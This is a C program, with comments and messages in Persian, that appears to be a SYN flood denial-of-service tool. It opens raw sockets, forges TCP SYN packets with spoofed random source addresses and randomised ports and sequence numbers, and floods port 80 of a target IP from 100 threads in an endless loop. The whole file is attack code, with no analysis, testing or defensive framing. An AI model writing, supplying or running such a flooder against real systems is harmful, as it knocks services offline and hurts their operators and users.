#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <unistd.h>

#define BUFFER_SIZE 65535
#define THREAD_COUNT 100

// ساخت هدر TCP
struct pseudo_header {
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
};

// محاسبه checksum
unsigned short calculate_checksum(unsigned short *ptr, int nbytes) {
    unsigned long sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        sum += *(unsigned char *)ptr;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

// ارسال بسته‌ها به IP مشخص
void *send_packets(void *arg) {
    char *target_ip = (char *)arg;
    int raw_socket = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);

    if (raw_socket < 0) {
        perror("خطا در ایجاد سوکت");
        pthread_exit(NULL);
    }

    char packet[BUFFER_SIZE];
    memset(packet, 0, BUFFER_SIZE);

    struct iphdr *ip_header = (struct iphdr *)packet;
    struct tcphdr *tcp_header = (struct tcphdr *)(packet + sizeof(struct iphdr));

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(80);
    inet_pton(AF_INET, target_ip, &target_addr.sin_addr);

    ip_header->ihl = 5;
    ip_header->version = 4;
    ip_header->tos = 0;
    ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    ip_header->frag_off = 0;
    ip_header->ttl = 255;
    ip_header->protocol = IPPROTO_TCP;

    tcp_header->dest = htons(80);
    tcp_header->doff = 5;
    tcp_header->syn = 1;
    tcp_header->window = htons(65535);

    while (1) {
        ip_header->saddr = htonl((rand() % 0xFFFFFF) + (10 << 24)); // IP تصادفی از 10.0.0.0/8
        ip_header->id = htonl(rand() % 65535);
        ip_header->daddr = target_addr.sin_addr.s_addr;

        tcp_header->source = htons(rand() % 65535);
        tcp_header->seq = htonl(rand());

        tcp_header->check = 0;
        ip_header->check = 0;

        struct pseudo_header psh;
        psh.source_address = ip_header->saddr;
        psh.dest_address = target_addr.sin_addr.s_addr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr));

        char pseudo_packet[sizeof(struct pseudo_header) + sizeof(struct tcphdr)];
        memcpy(pseudo_packet, &psh, sizeof(struct pseudo_header));
        memcpy(pseudo_packet + sizeof(struct pseudo_header), tcp_header, sizeof(struct tcphdr));

        tcp_header->check = calculate_checksum((unsigned short *)pseudo_packet, sizeof(pseudo_packet));

        ip_header->check = calculate_checksum((unsigned short *)ip_header, sizeof(struct iphdr));

        if (sendto(raw_socket, packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
            perror("خطا در ارسال بسته");
        }
    }

    close(raw_socket);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("استفاده: %s <آدرس IP مقصد>\n", argv[0]);
        return 1;
    }

    pthread_t threads[THREAD_COUNT];

    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_create(&threads[i], NULL, send_packets, argv[1]);
    }

    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }

    return 0;
}
